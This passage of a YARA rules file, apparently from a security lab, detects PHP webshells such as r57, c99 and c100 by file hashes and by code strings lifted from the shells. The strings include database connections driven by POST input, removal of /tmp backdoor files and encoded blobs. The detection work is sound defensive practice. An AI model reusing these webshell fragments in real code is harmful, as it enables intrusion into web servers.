      $s20 = "$login_txt = \"Restricted area\"; //http-auth message." fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _r57_r57_2 {
   meta:
      description = "php - from files r57.php, r57.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "1b92b1abcca09ac8d7d4d3b3c05e4decec11a31e4b71157305979e67df63bc7f"
      hash2 = "1b92b1abcca09ac8d7d4d3b3c05e4decec11a31e4b71157305979e67df63bc7f"
   strings:
      $s1 = "$db = @mysql_connect('localhost:'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);" fullword ascii
      $s2 = "$db = @mssql_connect('localhost,'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);" fullword ascii
      $s3 = "if(empty($_POST['db_port'])) { $_POST['db_port'] = '3306'; }" fullword ascii
      $s4 = "if(empty($_POST['db_port'])) { $_POST['db_port'] = '1433'; }" fullword ascii
      $s5 = "if(empty($_POST['db_port'])) { $_POST['db_port'] = '5432'; }" fullword ascii
      $s6 = "@mssql_query(\"drop table r57_temp_table\",$db);" fullword ascii
      $s7 = "echo \"<br><div align=center><font face=Verdana size=-2><b>[ <a href=\".$_SERVER['PHP_SELF'].\">BACK</a> ]</b></font></div>\";" fullword ascii
      $s8 = "echo \"<font face=Verdana size=-2 color=green><b>Query#\".$num.\" : \".htmlspecialchars($query).\"</b></font><br>\";" fullword ascii
      $s9 = "if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }" fullword ascii
      $s10 = "@ftp_close($connection);" fullword ascii
      $s11 = "$querys = @explode(';',$_POST['db_query']);" fullword ascii
      $s12 = "while (false !== ($file = @readdir($handle)))" fullword ascii
      $s13 = "switch($_POST['db'])" fullword ascii
      $s14 = "switch($_POST['what'])" fullword ascii
      $s15 = "@unlink(\"/tmp/dpc.c\");" fullword ascii
      $s16 = "@unlink(\"/tmp/bd.c\");" fullword ascii
      $s17 = "else echo \"[-] ERROR! Can't connect to MSSQL server\";" fullword ascii
      $s18 = "@closedir($handle);" fullword ascii
      $s19 = "else echo $lang[$language._text29];" fullword ascii
      $s20 = "else echo \"[-] ERROR! Can't select database\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _ajaxshell_angel_c100_c99_cyb3rsh3ll_r57_simattacker_3 {
   meta:
      description = "php - from files ajaxshell.php, angel.php, c100.php, c99.php, cyb3rsh3ll.php, r57.php, simattacker.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "41b3f472978109cfb97abbcde05c81bf9085c356e7f890f805e1efd078bdf093"
      hash2 = "80fe738fc052d94595dead391df3e26647e946120973521da619997ceec386bc"
      hash3 = "6ffef45e178b189c9eb486457dc6ae71a2e62be5724adc598d25585a6c0c6c1a"
      hash4 = "03b0b693f76b22e54eea716997b98b9a105c82b031439f72663d7b0209bd1f7d"
      hash5 = "22fe9c09c988fc7a1388240bedbaf1ad849f4e5f348566575219d7df041a3cc9"
      hash6 = "1b92b1abcca09ac8d7d4d3b3c05e4decec11a31e4b71157305979e67df63bc7f"
      hash7 = "853fc6cc1a770518998840773266e66d577f1c4f2c69dc5685ffb9e2f6e2afb6"
   strings:
      $s1 = "BKeTV6Y0d4cGRDZ25mQ2NwTERBc2UzMHBLUT09Z2hkZXNjb26/DJpDAAAADElEQVQIHWNgIA0AAAAwAAGErPF6AAAAAElFTkSuQmCC\"/>" fullword ascii
      $s2 = "5ZWFJ2Y254MWMyVnlRV2RsYm5SOGNHRnljMlZKYm5SOGRXRjhibk44YVhOSmJtbDBhV0ZzYVhwbFpIeHNNbGhXUjJkalNYUTFNV3QwUW1scFdFUTNRakZ0YzFVelMwNU" ascii
      $s3 = "lLVHN6SUdGOU1TQjFQVk11VkRzeElHVTlWaTVYT3pFZ2FqMGlleUlySWx4Y0luVmNYQ0k2SUZ4Y0lpSXJOaWgxS1NzaVhGd2lMQ0FpS3lKY1hDSlpYRndpT2lCY1hDSW" ascii
      $s4 = "BaaWdoSnljdWNtVndiR0ZqWlNndlhpOHNVM1J5YVc1bktTbDdkMmhwYkdVb1l5MHRLWEpiWlNoaktWMDlhMXRqWFh4OFpTaGpLVHRyUFZ0bWRXNWpkR2x2YmlobEtYdH" ascii
      $s5 = "9laWtwTzNvckszMHpJSEo5TkNCQktITXBlekVnWVQxY0oxd25PemtvTVNCcFBUQTdhVHh6TzJrckt5bDdZU3M5YkM1dEtGZ29UUzVRS0NrcVVTa3BmVE1nWVgwMElHc2" ascii
      $s6 = "BlekVnYVQwd096RWdlajB3T3pFZ2NqMWNKMXduT3prb01TQnBQVEE3YVR4a0xqYzdhU3NyS1hzMUtIbzlQWEF1TnlsNlBUQTdjaXM5YkM1dEtHUXVieWhwS1Y1d0xtOG" ascii
      $s7 = "hZMlVvYm1WM0lGSmxaMFY0Y0NnblhGeGlKeXRsS0dNcEt5ZGNYR0luTENkbkp5a3NhMXRqWFNrN2NtVjBkWEp1SUhCOUtDZFZMbmM5TkNCM0tHTXBlelFnZUNoa0xIQX" ascii
      $s8 = "xkSFZ5Ym54bWRXNWpkR2x2Ym54cFpueHpZVzU4YkdWdVozUm9mSFJpZkdadmNueDhmSHg4Zkh4OFJtbHlaV0oxWjN4OGZHVnVZM3hUZEhKcGJtZDhabkp2YlVOb1lYSk" ascii
      $s9 = "tLU2t6SUVzN015Qk1mVFFnTmloaEtYczFLRTRnWVQwOUlrOGlLVE1nWVM1RktDOWNYRnhjTDJjc0lseGNYRnhjWEZ4Y0lpa3VSU2d2WEZ3aUwyY3NJbHhjWEZ4Y1hDSW" ascii
      $s10 = "VLR2tzTVRZcExHSXViaWhwTERFMktTbDlNeUI0S0dJc2NDbDlOQ0E0S0NsN015Z3lMbkU5UFhRdVNDWW1NaTUyUFQxMExrY3BmVFFnZVNncGV6RWdZVDFTT3pVb0tESX" ascii
      $s11 = "hlU2dwS1hzeE15QXhOQ2dwTGpFMVBWd25NVGM2THk4eE9DMHhPUzFHTGpGaUwwWXZQMkU5WENjck1XTW9ZU2w5ZlNjc05qSXNOelVzSjN4MllYSjhkMmx1Wkc5M2ZISm" ascii
      $s12 = "laWFIxY200Z2NsdGxYWDFkTzJVOVpuVnVZM1JwYjI0b0tYdHlaWFIxY200blhGeDNLeWQ5TzJNOU1YMDdkMmhwYkdVb1l5MHRLV2xtS0d0YlkxMHBjRDF3TG5KbGNHeG" ascii
      $s13 = "hOakF3ZkhSeWRXVjhabUZzYzJWOFRXRjBhSHgwZVhCbGIyWjhjM1J5YVc1bmZISmhibVJ2Ylh3eU5UVjhNVFl3ZkdSdlkzVnRaVzUwZkZWU1RIeDBhR2x6Zkc1aGRtbG" ascii
      $s14 = "9jR0Z5YzJWSmJuUW9ZeTloS1NrcEt5Z29ZejFqSldFcFBqTTFQMU4wY21sdVp5NW1jbTl0UTJoaGNrTnZaR1VvWXlzeU9TazZZeTUwYjFOMGNtbHVaeWd6TmlrcGZUdH" ascii
      $s15 = "lLellvWlNrcklseGNJaXdnSWlzaVhGd2lXbHhjSWpvZ1hGd2lJaXMyS0dNcEt5SmNYQ0lnSWlzaWZTSTdNU0JtUFdzb2Fpd2lNVEVpS1RzeElHRTlNVElvWmlrN05TZ2" ascii
      $s16 = "tiMjFmYzNSeWZHTm9jbTl0Wlh4dmRYUmxjbGRwWkhSb2ZHOTFkR1Z5U0dWcFoyaDBmSEpsY0d4aFkyVjhZVzVoYkhsMGFXTnpmR2hsYVdkb2RIeDNhV1IwYUh3ek5UQj" ascii
      $s17 = "RiMlJsZkhOMVluTjBjbnhqYUdGeVEyOWtaVUYwZkh4cGJtNWxjbGRwWkhSb2ZIeDhjMk55WldWdWZIeHBibTVsY2tobGFXZG9kSHhyYTN4OFkyUjhmR2RsYmw5eVlXNW" ascii
      $s18 = "AAB510RVh0Z2hkZQBnaGRlc2NvblpYWmhiQ2htZFc1amRHbHZiaWh3TEdFc1l5eHJMR1VzY2lsN1pUMW1kVzVqZEdsdmJpaGpLWHR5WlhSMWNtNG9ZenhoUHljbk9tVW" ascii
      $s19 = "RhamgyTVh4aWRHOWhmRzVsZDN4SmJXRm5aWHh6Y21OOGZHaDBkSEI4WjI5dloyeGxmSE4wWVhScFkzeDNhR2xzWlh4amIyMThaVzVqYjJSbFZWSkpRMjl0Y0c5dVpXNT" ascii
      $s20 = "VhQ1ltTWk1b0xrSW1Kakl1YUM1Q0xqRXdLWHg4S0RJdVF5MHlMbkUrWVNsOGZDZ3lMa1F0TWk1MlBtRXBmSHdvT0NncEppWXlMa1E4U1NsOGZDZzRLQ2ttSmpJdVF6eE" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 800KB and ( 8 of them )
      ) or ( all of them )
}

